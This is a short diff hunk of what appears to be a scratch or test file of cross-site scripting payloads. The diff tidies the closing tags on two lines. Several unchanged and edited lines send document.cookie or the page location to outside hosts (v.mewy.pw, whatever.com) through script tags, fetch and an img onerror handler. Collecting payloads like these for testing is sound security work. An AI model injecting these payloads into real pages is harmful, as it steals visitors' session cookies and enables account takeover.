@@ -26,8 +26,8 @@ http://google.com/something else
 
 <script>alert(1)</script>
 <script src="jqeury.js">$.get("http://whatever.com"+documnet.cookei);
-<script>fetch("http://v.mewy.pw")</script
-<script>document.replace("XMLHttpRequest")<
+  <script>fetch("http://v.mewy.pw")</script>
+  <script>document.replace("XMLHttpRequest")</script>
 <script>document.location="http://v.mewy.pw?"+document.cookie</script>
 
 <img src=x onerror="document.location='http://v.mewy.pw?awekjawegn'+document.location"/>
